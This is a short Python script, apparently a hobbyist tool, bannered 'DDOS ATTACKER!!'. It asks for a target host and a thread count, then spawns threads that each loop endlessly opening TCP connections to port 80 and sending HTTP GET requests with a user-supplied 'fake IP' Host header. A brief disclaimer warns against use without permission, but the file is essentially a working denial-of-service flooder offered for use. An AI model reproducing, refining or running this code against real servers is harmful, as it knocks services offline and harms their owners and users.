#QUICK DISCLAIMER:
'''
this script allows you to send multiply requests for web server
DO NOT TRY THIS SCRIPT ON WEBSITS WITHOUT PREMISSION!
(and dont hack your dad website..)
'''
import pyfiglet # If you dont have this import type before run "pip/pip3 install pyfiglet"
import threading
import socket

#Banner
banner = pyfiglet.figlet_format("DDOS ATTACKER!!" ,width=110)
print(banner)
#Enter Target
Target = str(input("Enter Target IP/Domain name to DDOS: "))

#Enter Service port to attack
PORT = 80

#Enter Fake IP[this will not make you Anonymous..]
Fake_ip = input("Enter Fake ip: ")

#Function For the Packet sent to the target:
def attack():
    while True:
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.connect((Target, PORT))
        server.sendto(("GET /" + Target + " HTTP/1.1\r\n").encode('ascii'),(Target, PORT))
        server.sendto(("Host: " + Fake_ip + "\r\n\r\n").encode('ascii'),(Target, PORT))
        server.close

#Select How Many Requests to make:
req = int(input("Enter number of Requests: "))
     
#Execute the script:
for i in range(req):
    thread = threading.Thread(target=attack)
    thread.start()
    print("Attacking...")
